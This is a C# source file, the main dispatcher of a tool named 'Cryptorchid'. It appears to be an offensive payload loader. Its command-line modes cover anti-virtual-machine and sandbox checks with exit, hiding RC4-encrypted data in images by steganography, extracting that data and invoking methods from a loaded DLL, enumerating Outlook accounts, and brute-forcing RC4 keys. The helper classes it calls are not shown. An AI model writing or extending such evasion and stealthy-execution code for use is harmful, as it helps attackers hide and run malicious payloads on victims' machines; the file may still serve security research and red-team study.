using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cryptorchid
{
    public class Program
    {

        public static void Main(string[] args)
        {
            bool noDNS = args.Contains("-NoDNS", StringComparer.OrdinalIgnoreCase);

            // If noDNS is not specified, perform DNS check
            if (!noDNS)
            {
                string inputIPAddress = args.FirstOrDefault(arg => !arg.StartsWith("-"));
                if (string.IsNullOrEmpty(inputIPAddress))
                {
                    Console.WriteLine("Usage: Cryptorchid.exe <IPAddress> | -NoDNS");
                    return;
                }
                DNSCheck.CheckDNSAndContinue(inputIPAddress);
            }

            if (args.Contains("-antivm", StringComparer.OrdinalIgnoreCase))
            {
                // Check for virtualization
                if (AntiVirtualization.Execute())
                {
                    Console.WriteLine("Virtual machine detected. Exiting...");
                    Environment.Exit(1);
                }
                else
                {
                    Console.WriteLine("No sandbox or debuggers found.");
                }
            }
            else if (args.Contains("-testload", StringComparer.OrdinalIgnoreCase))
            {
                string hardcodedMethodSignature = "Calc.Modes.RunCalc.Execute";

                try
                {
                    Load.TestLoad(hardcodedMethodSignature);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error invoking method from precompiled DLL: {ex.Message}");
                }
                return; // Exit after loading and invoking
            }

            // UPN args
            if (args.Contains("-listaccounts", StringComparer.OrdinalIgnoreCase))
            {
                /*UPN.DisplayUPNAndHash();*/
                UPN.ListOutlookAccounts();
                return; // Exit after displaying UPN and hash
            }
            if (args.Contains("-hash", StringComparer.OrdinalIgnoreCase))
            {
                int hashIndex = Array.IndexOf(args, "-hash");
                if (hashIndex >= 0 && hashIndex < args.Length - 1)
                {
                    string input = args[hashIndex + 1];
                    UPN.HashUPN(input);
                }
                else
                {
                    Console.WriteLine("Please provide a string to hash after the -hash argument.");
                }
                return;
            }

            if (args.Contains("-hideupn", StringComparer.OrdinalIgnoreCase))
            {
                int hideIndex = Array.IndexOf(args, "-hideupn");
                if (hideIndex >= 0 && hideIndex < args.Length - 2)
                {
                    string upn = args[hideIndex + 1];
                    string imageFilePath = args[hideIndex + 2];
                    string hashedValue = SteganographyHelper.GetSha256Hash(upn);
                    SteganographyHelper.HideUPNInImage(imageFilePath, upn);
                    Console.WriteLine($"UPN: {upn} has been hidden in {imageFilePath}");
                    Console.WriteLine($"Hashed Value: {hashedValue}");
                }
                else
                {
                    Console.WriteLine("Please provide a UPN and image file path after the -hideupn argument.");
                }
                return;
            }

            if (args.Contains("-getupn", StringComparer.OrdinalIgnoreCase))
            {
                int getIndex = Array.IndexOf(args, "-getupn");
                if (getIndex >= 0 && getIndex < args.Length - 1)
                {
                    string imageFilePath = args[getIndex + 1];
                    string retrievedHash = SteganographyHelper.RetrieveUPNFromImage(imageFilePath);
                    Console.WriteLine($"Retrieved Hash: {retrievedHash}");
                }
                else
                {
                    Console.WriteLine("Please provide an image file path after the -getupn argument.");
                }
                return;
            }
            if (args.Contains("-encryptupn", StringComparer.OrdinalIgnoreCase))
            {
                int encryptIndex = Array.IndexOf(args, "-encryptupn");
                if (encryptIndex >= 0 && encryptIndex < args.Length - 3)
                {
                    string upn = args[encryptIndex + 1];
                    string inputFilePath = args[encryptIndex + 2];
                    string imageFilePath = args[encryptIndex + 3];
                    string newImageFilePath = Path.Combine(Path.GetDirectoryName(imageFilePath), Path.GetFileNameWithoutExtension(imageFilePath) + "_copy" + Path.GetExtension(imageFilePath));

                    SteganographyHelper.UPNEncrypt(inputFilePath, newImageFilePath, upn);
                    Console.WriteLine($"UPN: {upn} has been encrypted and hidden in {newImageFilePath}");
                }
                else
                {
                    Console.WriteLine("Please provide a UPN, input file path, and image file path after the -encryptupn argument.");
                }
                return;
            }

            if (args.Contains("-decryptupn", StringComparer.OrdinalIgnoreCase))
            {
                int decryptIndex = Array.IndexOf(args, "-decryptupn");
                if (decryptIndex >= 0 && decryptIndex < args.Length - 2)
                {
                    string imageFilePath = args[decryptIndex + 1];
                    string methodSignature = args[decryptIndex + 2];
                    SteganographyHelper.UPNDecrypt(imageFilePath, methodSignature);
                }
                else
                {
                    Console.WriteLine("Please provide an image file path and method signature after the -decryptupn argument.");
                }
                return;
            }

            // steg args
            if (args.Contains("-steg", StringComparer.OrdinalIgnoreCase))
            {
                string key = args.SkipWhile(arg => !arg.Equals("-steg", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
                string inputFilePath = args.SkipWhile(arg => !arg.Equals("-steg", StringComparison.OrdinalIgnoreCase)).Skip(2).FirstOrDefault();
                string imageFilePath = args.SkipWhile(arg => !arg.Equals("-steg", StringComparison.OrdinalIgnoreCase)).Skip(3).FirstOrDefault();

                if (!string.IsNullOrEmpty(key) && !string.IsNullOrEmpty(inputFilePath) && !string.IsNullOrEmpty(imageFilePath))
                {
                    try
                    {
                        Steg.EncryptAndHideInImage(inputFilePath, imageFilePath, key);
                        string newImageFilePath = Path.Combine(Path.GetDirectoryName(imageFilePath), Path.GetFileNameWithoutExtension(imageFilePath) + "_copy" + Path.GetExtension(imageFilePath));
                        Console.WriteLine($"Hash added to image {newImageFilePath}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error adding hash: {ex.Message}");
                    }
                }
                else
                {
                    Console.WriteLine("Please provide a valid key, input file path, and image file path.");
                    Console.WriteLine("Example: -steg <encryptionKey> <inputFilePath> <imageFilePath>");
                }
                return; // Exit after adding hash
            }

            else if (args.Contains("-stegload", StringComparer.OrdinalIgnoreCase))
            {
                string imageFilePath = args.SkipWhile(arg => !arg.Equals("-stegload", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
                string methodSignature = args.SkipWhile(arg => !arg.Equals("-stegload", StringComparison.OrdinalIgnoreCase)).Skip(2).FirstOrDefault();

                if (string.IsNullOrEmpty(methodSignature))
                {
                    Console.WriteLine("Error: Method signature must be provided e.x. Calc.Modes.RunCalc.Execute");
                    return;
                }

                try
                {
                    Steg.ExStegDecryptAndLoad(imageFilePath, methodSignature);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error extracting hash, decrypting data, or invoking method: {ex.Message}");
                }
                return;
            }

            if (args.Contains("-desteg", StringComparer.OrdinalIgnoreCase))
            {
                string imageFilePath = args.SkipWhile(arg => !arg.Equals("-desteg", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();

                try
                {
                    Steg.ExStegDecrypt(imageFilePath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error extracting hash or decrypting data: {ex.Message}");
                }
                return; // Exit after decryption
            }

            if (args.Contains("-encrypt", StringComparer.OrdinalIgnoreCase))
            {
                string inputFilePath = args.SkipWhile(arg => !arg.Equals("-encrypt", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
                string key = args.SkipWhile(arg => !arg.Equals("-encrypt", StringComparison.OrdinalIgnoreCase)).Skip(2).FirstOrDefault();

                if (string.IsNullOrEmpty(inputFilePath) || string.IsNullOrEmpty(key))
                {
                    Console.WriteLine("Usage: Cryptorchid.exe -encrypt <inputFilePath> <key>");
                    return;
                }

                // Set the input file to be read inside ExEncrypt
                Encrypt.ExEncrypt(inputFilePath, key);
                return; // Exit after encryption
            }

            // Handle  decrypt
            if (args.Contains("-decrypt", StringComparer.OrdinalIgnoreCase))
            {
                string outputPath = args.SkipWhile(arg => !arg.Equals("-decrypt", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
                Encrypt.ExDecrypt(string.IsNullOrEmpty(outputPath) ? null : outputPath);
                return; // Exit after decryption
            }

            if (args.Contains("-gethash", StringComparer.OrdinalIgnoreCase))
            {
                string inputFilePath = args.SkipWhile(arg => !arg.Equals("-gethash", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
                if (!string.IsNullOrEmpty(inputFilePath))
                {
                    try
                    {
                        uint hash = Steg.ExtractHashFromImage(inputFilePath);
                        Console.WriteLine($"Hash from metadata: {hash}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error extracting hash: {ex.Message}");
                    }
                }
                else
                {
                    Console.WriteLine("Please provide a valid file path.");
                }
                return; // Exit after extracting hash
            }

            // Handle -example argument
            if (args.Contains("-example", StringComparer.OrdinalIgnoreCase))
            {
                string key = "aMsI";
                string plaintext = "Teeth Of Lions Rule the Divine";
                byte[] keyBytes = Encoding.ASCII.GetBytes(key);
                byte[] inputBytes = Encoding.ASCII.GetBytes(plaintext);
                byte[] outputBytes = new byte[inputBytes.Length];

                Encrypt.RC4EncryptDecrypt(keyBytes, inputBytes, outputBytes);
                Console.WriteLine("Encrypted: " + BitConverter.ToString(outputBytes));

                byte[] decryptedBytes = new byte[inputBytes.Length];
                Encrypt.RC4EncryptDecrypt(keyBytes, outputBytes, decryptedBytes);
                Console.WriteLine("Decrypted: " + Encoding.ASCII.GetString(decryptedBytes));

                // Brute force key cracking (with an example hardcoded hash)
                uint hardcodedHash = Encrypt.DJB2Hash(inputBytes);
                string crackedKey = Encrypt.CrackKey(outputBytes, hardcodedHash);
                Console.WriteLine("Cracked Key: " + crackedKey);

                return; // Exit after example
            }
        }
    }
}
